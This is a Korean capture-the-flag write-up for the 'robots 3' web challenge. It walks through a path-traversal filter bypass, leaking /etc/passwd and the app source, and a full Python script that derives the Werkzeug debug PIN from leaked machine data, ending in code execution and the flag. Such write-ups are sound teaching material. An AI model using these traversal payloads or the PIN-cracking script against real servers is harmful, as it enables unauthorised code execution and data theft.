# [Web] robots 3

## Summary

1. Local File Inclusion을 통한 app.py 유출(../ 필터링 우회 -> ....////)
2. zero division exception 발생을 통한 metadata 입수
3. Local File Inclusion을 통한 Werkzeug Debug Pin Crack 데이터 입수
4. exploit pin
5. RCE on Server

## Description

*@author r99bbit*

<br/>

감히 인간 따위가 로봇을 공격하다니.. 이젠 모든 취약점을 막았으니 `flag`를 획득할 수는 없을 것이다..!

<br/>

`robots3`의 서버에 침투했었던 한 연구원의 증언에 의하면 `robots2`에 존재하던 취약점은 `replace()`에 의해 방어되었다고 한다.

```
replace(<공격 문자열>, '')
```

<br>

접속정보 : `robots2` 문제의 접속 서버 포트 + 77

<br/>

FLAG 위치는 `/flag` 입니다.

<br/>

FLAG 형식은 `JFS{...}` 입니다.

## Solve

- robots2에 존재하던 LFI 취약점이 replace에 의해 방어된 듯 하지만, 다음과 같은 방법으로 우회 가능하다

```
$ curl http://34.64.214.222/getImage?filename=....//....//....//....//....//....//....//....//....//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
robots3:x:1000:1000::/home/robots3:/bin/sh
```



- 이를 이용하여 app.py를 leak할 수 있다.

```
$ curl http://34.64.214.222/getImage?filename=....//....//app.py
from flask import Flask, request
import os
import uuid

app = Flask(__name__)
....
```



- `app.py` 라우팅에 무엇인가 추가되었다. `/div` 라우팅을 통해 zero division exception을 발생시킬 수 있으며, debug 플래그가 True로 되어있어 Werkzeug Debug에 진입할 수 있을 것이라는 것을 확인할 수 있다.

```
@app.route('/mul')
def mul():
    try:
        param = request.args.to_dict()
        arg1 = int(param['arg1'])
        arg2 = int(param['arg2'])
        res = arg1 * arg2
        res = "result : " + str(res)
        return res
    except:
        return "error."

@app.route('/div')
def div():
    try:
        param = request.args.to_dict()
        arg1 = int(param['arg1'])
        arg2 = int(param['arg2'])
    except:
        return "error."
    res = arg1 / arg2
    res = "result : " + str(res)
    return res

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)
```

- LFI 취약점과 Exception 발생으로 인한 Werkzeug Debug 상태를 조합하면 Debug Pin을 Crack하여 RCE 할 수 있다. `/etc/machine-id`, MAC 주소를 포함하여 일련의 pin 생성 과정이 존재하는데, 이는 python 버전만 알 수 있다면 충분히 exploit할 수 있다.
- python3.6 기준으로 exploit을 해보면 아래와 같다.

```
import hashlib
from itertools import chain
import requests

HOST = 'http://localhost:80'

def generate(id):
	linux = id
	linux = linux.replace('\n', '')
	CGROUP = requests.get(f'{HOST}/getImage?filename=....//....//....//....//....//....//....//proc/self/cgroup').text
	
	f = open('cgroup', 'w')
	f.write(CGROUP)
	f.close()
	
	with open("cgroup", "rb") as f:
		linux += str(f.readline().strip().rpartition(b"/")[2])
	
	linux = linux.replace("b'", "")
	linux = linux.replace("'", "")

	return linux

def getnode(macaddr):
	macaddr = macaddr.replace(':', '')
	macaddr = macaddr.replace('\n', '')
	macaddr = '0x' + macaddr
	return str(int(macaddr, 0))

MAC_ADDR = requests.get(f'{HOST}/getImage?filename=....//....//....//....//....//....//....//sys/class/net/eth0/address').text
MAC_ADDR = getnode(MAC_ADDR)

MACHINE_ID = requests.get(f'{HOST}/getImage?filename=....//....//....//....//....//....//....//etc/machine-id').text
MACHINE_ID = generate(MACHINE_ID)

probably_public_bits = [
	'robots3', # username
	'flask.app',# modname 고정
	'Flask',    # getattr(app, '__name__', getattr(app.__class__, '__name__')) 고정
	'/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
 
private_bits = [
	MAC_ADDR, # /sys/class/net/ens4/address 
	MACHINE_ID
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode("utf-8")
	h.update(bit)
h.update(b"cookiesalt")
 
cookie_name = f"__wzd{h.hexdigest()[:20]}"
 
num = None
if num is None:
	h.update(b"pinsalt")
	num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = "-".join(
				num[x : x + group_size].rjust(group_size, "0")
				for x in range(0, len(num), group_size)
			)
			break
	else:
		rv = num

print(rv)
```

```
# python3 exploit.py 
479-661-428
```

- debug pin을 Werkzeug Debug에 입력하면 서버에 Python 코드로 RCE가 가능하다.

```
>>> import os
>>> os.popen("/flag").read()
'JFS{Be4t_the_de6ug_9in_!&^&}'
>>> 
```

- `JFS{Be4t_the_de6ug_9in_!&^&}`

